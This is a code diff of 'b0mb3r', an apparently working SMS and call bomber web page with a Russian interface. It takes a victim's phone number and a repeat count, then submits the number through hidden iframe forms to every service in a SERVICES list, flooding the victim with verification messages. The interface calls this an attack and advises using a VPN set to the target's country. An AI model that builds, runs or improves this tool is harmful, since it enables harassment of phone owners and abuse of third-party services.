@@ -6,69 +6,85 @@
     <title>b0mb3r</title>
     <style>
         :root {
-            --bg-color: #0d1117; --card-bg: #161b22; --border-color: #30363d;
-            --accent-red: #d32f2f; --text-main: #c9d1d9;
+            --bg: #0d1117; --card: #161b22; --brd: #30363d;
+            --red: #d32f2f; --txt: #f0f6fc; --dim: #8b949e;
         }
         * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; outline: none; }
         body {
-            background-color: var(--bg-color); color: var(--text-main);
-            font-family: -apple-system, system-ui, sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; margin: 0; overflow: hidden;
+            background-color: var(--bg); color: var(--txt);
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; height: 100vh; margin: 0;
         }
-        .main-container { text-align: center; width: 100%; max-width: 280px; }
-        .logo { font-size: 38px; font-weight: bold; margin-bottom: 5px; color: #fff; }
-        .vpn-status { font-size: 11px; color: #238636; margin-bottom: 20px; border: 1px dashed #238636; padding: 5px; border-radius: 4px; }
+        .main { text-align: center; width: 100%; max-width: 300px; }
+        .logo { font-size: 42px; font-weight: bold; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 10px; }
         
-        .controls-row { display: flex; justify-content: center; gap: 6px; }
-        .phone-group { display: flex; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 6px; width: 200px; align-items: center; }
-        .custom-select { width: 80px; padding: 12px 5px; display: flex; align-items: center; justify-content: center; gap: 6px; cursor: pointer; }
-        .phone-input { background: transparent; border: none; color: #fff; padding: 12px 5px; font-size: 13px; flex: 1; }
+        .srv-info { font-size: 14px; color: var(--dim); margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        .srv-badge { background: var(--red); color: #fff; padding: 2px 10px; border-radius: 12px; font-weight: bold; font-size: 12px; }
+
+        .row { display: flex; gap: 8px; margin-bottom: 8px; }
+        .input-box { display: flex; background: var(--card); border: 1px solid var(--brd); border-radius: 10px; flex: 1; align-items: center; overflow: hidden; }
+        .sel { padding: 12px; display: flex; align-items: center; gap: 8px; border-right: 1px solid var(--brd); cursor: pointer; }
+        .phone { background: transparent; border: none; color: #fff; padding: 12px; width: 100%; font-size: 15px; }
         
-        .loops-group { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 6px; width: 42px; height: 42px; }
-        .loops-input { background: transparent; border: none; color: #fff; width: 100%; height: 100%; text-align: center; }
+        .loops-box { background: var(--card); border: 1px solid var(--brd); border-radius: 10px; width: 55px; display: flex; align-items: center; justify-content: center; }
+        .loops { background: transparent; border: none; color: #fff; width: 100%; text-align: center; font-size: 15px; }
 
-        .btn-start { background: var(--accent-red); color: #fff; border: none; border-radius: 6px; padding: 12px; font-weight: bold; width: 100%; margin-top: 15px; cursor: pointer; }
-        .s-info { color: #8b949e; font-size: 11px; margin-top: 15px; }
+        .hint { color: var(--dim); font-size: 11px; margin-bottom: 20px; }
 
-        .loader { position: fixed; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.85); z-index: 100; }
-        .drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: #161b22; border-top: 1px solid var(--border-color); border-radius: 20px 20px 0 0; transition: 0.3s; z-index: 110; padding: 20px; }
-        .drawer.active { bottom: 0; }
-        .d-item { padding: 15px; border-bottom: 1px solid #21262d; display: flex; justify-content: space-between; }
-        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 90; }
+        .btn { background: var(--red); color: #fff; border: none; border-radius: 10px; padding: 18px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.97); }
+
+        .footer { position: absolute; bottom: 30px; color: var(--dim); font-size: 14px; letter-spacing: 1px; }
+
+        /* Loader */
+        .ldr { position: fixed; inset: 0; background: rgba(13,17,23,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 100; }
+        .spin { width: 40px; height: 40px; border: 3px solid var(--brd); border-top-color: var(--red); border-radius: 50%; animation: s 1s linear infinite; margin-bottom: 15px; }
+        @keyframes s { to { transform: rotate(360deg); } }
+
+        /* Drawer */
+        .drw { position: fixed; bottom: -100%; left: 0; right: 0; background: var(--card); border-top: 1px solid var(--brd); border-radius: 20px 20px 0 0; transition: 0.3s; z-index: 200; padding: 20px; }
+        .drw.active { bottom: 0; }
+        .d-item { padding: 18px; border-bottom: 1px solid var(--brd); display: flex; justify-content: space-between; cursor: pointer; }
+        .ovl { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
     </style>
 </head>
 <body>
-    <div class="overlay" id="ovl"></div>
-    <div class="loader" id="ldr"><div style="color:#fff" id="stat">Отправка...</div></div>
-
-    <div class="main-container">
-        <div class="logo">b0mb3r 💣</div>
-        <div class="vpn-status">VPN: Пользовательский (Включите VPN страны цели)</div>
-        
-        <form id="bForm">
-            <div class="controls-row">
-                <div class="phone-group">
-                    <div class="custom-select" id="cTrig">
-                        <img src="https://purecatamphetamine.github.io/country-flag-icons/3x2/RU.svg" width="18" id="cFlag">
-                        <span id="cCode">+7</span>
-                    </div>
-                    <input type="tel" class="phone-input" id="phone" placeholder="9995203899" required>
-                </div>
-                <div class="loops-group">
-                    <input type="number" class="loops-input" id="loops" value="1">
-                </div>
-            </div>
-            <button type="submit" class="btn-start">ЗАПУСТИТЬ</button>
-        </form>
-        <div class="s-info">Сервисов в базе: <span id="sCount">0</span></div>
+    <div class="ovl" id="ovl"></div>
+    <div class="ldr" id="ldr">
+        <div class="spin"></div>
+        <div id="stat" style="font-weight:bold">Атака запущена...</div>
     </div>
 
-    <div class="drawer" id="drw">
-        <div class="d-item" onclick="sel('RU','+7')"><span>🇷🇺 Россия</span><span>+7</span></div>
-        <div class="d-item" onclick="sel('UA','+380')"><span>🇺🇦 Украина</span><span>+380</span></div>
-        <div class="d-item" onclick="sel('BY','+375')"><span>🇧🇾 Беларусь</span><span>+375</span></div>
-        <div class="d-item" onclick="sel('KZ','+7')"><span>🇰🇿 Казахстан</span><span>+7</span></div>
+    <div class="main">
+        <div class="logo">b0mb3r 💣</div>
+        <div class="srv-info">Сервисов: <span class="srv-badge" id="sCount">...</span></div>
+        
+        <form id="bombForm">
+            <div class="row">
+                <div class="input-box">
+                    <div class="sel" id="cTrig">
+                        <img id="flag" src="https://purecatamphetamine.github.io/country-flag-icons/3x2/RU.svg" width="20">
+                        <span id="code">+7</span>
+                    </div>
+                    <input type="tel" class="phone" id="phone" placeholder="9123456789" required>
+                </div>
+                <div class="loops-box">
+                    <input type="number" class="loops" id="loops" value="1" min="1" max="10">
+                </div>
+            </div>
+            <div class="hint">макс. повторов: 5</div>
+            <button type="submit" class="btn">Начать атаку</button>
+        </form>
+    </div>
+
+    <div class="footer">#cruxteam</div>
+
+    <div class="drw" id="drw">
+        <div class="d-item" onclick="set('RU','+7')"><span>🇷🇺 Россия</span><span>+7</span></div>
+        <div class="d-item" onclick="set('UA','+380')"><span>🇺🇦 Украина</span><span>+380</span></div>
+        <div class="d-item" onclick="set('BY','+375')"><span>🇧🇾 Беларусь</span><span>+375</span></div>
+        <div class="d-item" onclick="set('KZ','+7')"><span>🇰🇿 Казахстан</span><span>+7</span></div>
     </div>
 
     <div id="bridge" style="display:none"></div>
@@ -76,51 +92,54 @@
     <script src="services.js"></script>
     <script>
         window.onload = () => { document.getElementById('sCount').innerText = SERVICES.length; };
-        
+
         const drw = document.getElementById('drw');
         const ovl = document.getElementById('ovl');
         document.getElementById('cTrig').onclick = () => { drw.classList.add('active'); ovl.style.display='block'; };
         ovl.onclick = () => { drw.classList.remove('active'); ovl.style.display='none'; };
 
-        function sel(iso, code) {
-            document.getElementById('cFlag').src = `https://purecatamphetamine.github.io/country-flag-icons/3x2/${iso}.svg`;
-            document.getElementById('cCode').innerText = code;
+        function set(iso, c) {
+            document.getElementById('flag').src = `https://purecatamphetamine.github.io/country-flag-icons/3x2/${iso}.svg`;
+            document.getElementById('code').innerText = c;
             drw.classList.remove('active'); ovl.style.display='none';
         }
 
-        document.getElementById('bForm').onsubmit = async (e) => {
+        document.getElementById('bombForm').onsubmit = async (e) => {
             e.preventDefault();
-            const fullPhone = document.getElementById('cCode').innerText.replace('+','') + document.getElementById('phone').value;
-            const loops = parseInt(document.getElementById('loops').value) || 1;
+            const phone = document.getElementById('code').innerText.replace('+','') + document.getElementById('phone').value;
+            const loops = Math.min(parseInt(document.getElementById('loops').value) || 1, 5);
             const ldr = document.getElementById('ldr');
             const stat = document.getElementById('stat');
             const bridge = document.getElementById('bridge');
 
             ldr.style.display = 'flex';
-            let total = 0;
+            let count = 0;
 
             for (let i = 0; i < loops; i++) {
                 for (const s of SERVICES) {
-                    total++;
-                    stat.innerText = `Атака... [${total}]`;
+                    count++;
+                    stat.innerText = `Отправка: ${count}`;
                     try {
-                        const target = typeof s.url === 'function' ? s.url(fullPhone) : s.url;
+                        const target = typeof s.url === 'function' ? s.url(phone) : s.url;
                         const form = document.createElement('form');
-                        form.method = 'POST'; form.action = target; form.target = 'ifrm';
+                        form.method = 'POST'; form.action = target; form.target = 'v_frame';
+                        
                         const inp = document.createElement('input');
                         inp.name = s.formName || 'phone';
-                        inp.value = s.json ? JSON.stringify(s.json(fullPhone)) : fullPhone;
+                        inp.value = s.json ? JSON.stringify(s.json(phone)) : phone;
+                        
                         form.appendChild(inp);
-                        const ifr = document.createElement('iframe'); ifr.name = 'ifrm';
+                        const ifr = document.createElement('iframe'); ifr.name = 'v_frame';
                         bridge.appendChild(ifr); bridge.appendChild(form);
+                        
                         form.submit();
-                        setTimeout(() => bridge.innerHTML = '', 500);
+                        setTimeout(() => bridge.innerHTML = '', 400);
                     } catch(e) {}
-                    await new Promise(r => setTimeout(r, 350));
+                    await new Promise(r => setTimeout(r, 300));
                 }
             }
             ldr.style.display = 'none';
-            alert("Завершено!");
+            alert("Атака успешно завершена!");
         };
     </script>
 </body>
